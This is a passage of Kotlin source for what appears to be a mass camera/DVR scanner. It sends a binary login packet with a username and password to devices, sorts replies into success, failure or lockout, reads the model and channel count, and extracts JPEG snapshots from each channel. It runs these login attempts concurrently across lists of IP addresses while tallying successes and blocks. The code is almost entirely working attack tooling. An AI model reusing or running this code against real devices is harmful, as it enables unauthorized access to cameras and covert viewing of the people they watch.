        packet.write(byteArrayOf(0xa0.toByte(), 0x00, 0x00, 0x60))
        packet.write(byteArrayOf(totalLen.toByte()))
        packet.write(byteArrayOf(0x00, 0x00, 0x00))
        packet.write(loginPadded)
        packet.write(passPadded)
        packet.write(byteArrayOf(0x04, 0x01, 0x00, 0x00, 0x00, 0x00, 0xa1.toByte(), 0xaa.toByte()))
        packet.write(loginAscii)
        packet.write("&&".toByteArray(Charsets.US_ASCII))
        packet.write(passAscii)
        packet.write(byteArrayOf(0x00))
        packet.write("Random:".toByteArray(Charsets.US_ASCII))
        packet.write(timestamp)
        packet.write("\r\n\r\n".toByteArray(Charsets.US_ASCII))

        output.write(packet.toByteArray())
        output.flush()

        val response = ByteArray(128)
        var totalRead = 0
        val deadline = System.currentTimeMillis() + TIMEOUT_READ
        while (totalRead < 10 && System.currentTimeMillis() < deadline) {
            val r = input.read(response, totalRead, 128 - totalRead)
            if (r == -1) return AuthStatus.FAIL
            totalRead += r
        }
        if (totalRead < 10) return AuthStatus.FAIL

        if (response[8].toInt() == 0) return AuthStatus.SUCCESS
        if (response[8].toInt() == 1 && response[9].toInt() == 4) return AuthStatus.BLOCKED
        return AuthStatus.FAIL
    }

    private fun getModel(output: OutputStream, input: InputStream): String {
        val cmd = ByteArray(32)
        cmd[0] = 0xa4.toByte()
        cmd[8] = 0x0b
        output.write(cmd)
        output.flush()
        val data = receiveMsg(input)
        val zeroIdx = data.indexOf(0x00)
        return if (zeroIdx > 0) String(data, 0, zeroIdx, Charsets.US_ASCII)
        else if (data.isNotEmpty()) String(data, Charsets.US_ASCII).trim()
        else "unknown"
    }

    private fun getChannelsCount(output: OutputStream, input: InputStream): Int {
        val cmd = ByteArray(32)
        cmd[0] = 0xa8.toByte()
        cmd[8] = 0x01
        output.write(cmd)
        output.flush()
        val data = receiveMsg(input)
        val dataStr = String(data, Charsets.US_ASCII)
        return "&&".toRegex().findAll(dataStr).count() + 1
    }

    private fun receiveMsg(input: InputStream): ByteArray {
        val header = readExact(input, 32) ?: return ByteArray(0)
        val length = ((header[5].toInt() and 0xFF) shl 8) or (header[4].toInt() and 0xFF)
        if (length <= 0 || length > 65535) return ByteArray(0)
        return readExact(input, length) ?: ByteArray(0)
    }

    private fun getSnapshot(output: OutputStream, input: InputStream, channelId: Int): ByteArray? {
        val chByte = channelId.toByte()
        val cmd = byteArrayOf(
            0x11, 0x00, 0x00, 0x00, 0x28, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00, 0x0a, 0x00, 0x00, 0x00,
            chByte, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00, chByte, 0x00, 0x00, 0x00,
            0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
        )
        output.write(cmd)
        output.flush()

        val buffer = ByteArrayOutputStream()
        val chunk = ByteArray(8192)
        val deadline = System.currentTimeMillis() + TIMEOUT_SNAPSHOT
        var firstChunk = true

        while (System.currentTimeMillis() < deadline) {
            try {
                val r = input.read(chunk)
                if (r == -1) break
                if (firstChunk) {
                    if (r > 32) buffer.write(chunk, 32, r - 32)
                    firstChunk = false
                } else {
                    buffer.write(chunk, 0, r)
                }
                val data = buffer.toByteArray()
                if (findMarker(data, 0xFF.toByte(), 0xD9.toByte()) != -1) break
            } catch (_: java.net.SocketTimeoutException) { break }
        }

        var data = buffer.toByteArray()
        data = cleanGarbage(data, channelId.toByte())
        val startIdx = findMarker(data, 0xFF.toByte(), 0xD8.toByte())
        val endIdx = findMarker(data, 0xFF.toByte(), 0xD9.toByte())
        if (startIdx != -1 && endIdx != -1 && startIdx < endIdx) {
            val jpeg = data.copyOfRange(startIdx, endIdx + 2)
            return if (jpeg.size > 100) jpeg else null
        }
        return null
    }

    private fun cleanGarbage(data: ByteArray, chByte: Byte): ByteArray {
        val garbage1 = byteArrayOf(0x0a, chByte, 0x00, 0x00, 0x0a, 0x00, 0x00, 0x00)
        val garbage2 = byteArrayOf(0xbc.toByte(), 0x00, 0x00, 0x00, 0x00, 0x80.toByte(), 0x00, 0x00, chByte)
        var result = data
        var changed = true
        while (changed) {
            changed = false
            val pos = findPattern(result, garbage1)
            if (pos != -1) {
                result = removeRange(result, maxOf(0, pos - 24), pos + garbage1.size)
                changed = true
            }
        }
        changed = true
        while (changed) {
            changed = false
            val pos = findPattern(result, garbage2)
            if (pos != -1) {
                result = removeRange(result, pos, minOf(pos + 32, result.size))
                changed = true
            }
        }
        return result
    }

    private fun removeRange(data: ByteArray, from: Int, to: Int): ByteArray {
        val out = ByteArray(data.size - (to - from))
        data.copyInto(out, 0, 0, from)
        data.copyInto(out, from, to, data.size)
        return out
    }

    private fun findPattern(data: ByteArray, pattern: ByteArray): Int {
        for (i in 0..data.size - pattern.size) {
            var match = true
            for (j in pattern.indices) {
                if (data[i + j] != pattern[j]) { match = false; break }
            }
            if (match) return i
        }
        return -1
    }

    private fun findMarker(data: ByteArray, b1: Byte, b2: Byte): Int {
        for (i in 0 until data.size - 1) {
            if (data[i] == b1 && data[i + 1] == b2) return i
        }
        return -1
    }

    private fun readExact(input: InputStream, size: Int): ByteArray? {
        val buf = ByteArray(size)
        var off = 0
        while (off < size) {
            val r = input.read(buf, off, size - off)
            if (r == -1) return if (off > 0) buf.copyOf(off) else null
            off += r
        }
        return buf
    }

    private fun extractXmlField(xml: String, tag: String): String? {
        val startTag = "<$tag>"
        val endTag = "</$tag>"
        val startIdx = xml.indexOf(startTag)
        if (startIdx == -1) return null
        val valueStart = startIdx + startTag.length
        val endIdx = xml.indexOf(endTag, valueStart)
        if (endIdx == -1) return null
        return xml.substring(valueStart, endIdx).trim()
    }

    // ─── Сканирование через плагин ───

    suspend fun scanWithPlugin(
        plugin: ScanPlugin,
        ips: List<String>,
        onResult: suspend (ScanResult) -> Unit,
        onProgress: suspend (ScanProgress) -> Unit
    ) {
        cancelled = false
        checkedCount.set(0)
        successCount.set(0)
        blockedCount.set(0)
        val total = ips.size
        val startTime = System.currentTimeMillis()

        coroutineScope {
            val progressJob = launch(Dispatchers.Default) {
                while (isActive && !cancelled && checkedCount.get() < total) {
                    delay(200)
                    val elapsed = System.currentTimeMillis() - startTime
                    onProgress(ScanProgress(total, checkedCount.get(), successCount.get(), blockedCount.get(), elapsed))
                }
            }

            ips.map { ip ->
                async(Dispatchers.IO) {
                    if (cancelled) {
                        checkedCount.incrementAndGet()
                        return@async
                    }
                    semaphore.withPermit {
                        if (cancelled) {
                            checkedCount.incrementAndGet()
                            return@withPermit
                        }
                        try {
                            val result = PluginManager.scanWithPlugin(plugin, ip)
                            if (result != null) {
                                successCount.incrementAndGet()
                                onResult(result)
                            }
                        } catch (_: Exception) {}
                        checkedCount.incrementAndGet()
                    }
                }
            }.awaitAll()

            progressJob.cancel()
        }
        val elapsed = System.currentTimeMillis() - startTime
        onProgress(ScanProgress(total, checkedCount.get(), successCount.get(), blockedCount.get(), elapsed,
            finished = !cancelled, cancelled = cancelled))
    }
}
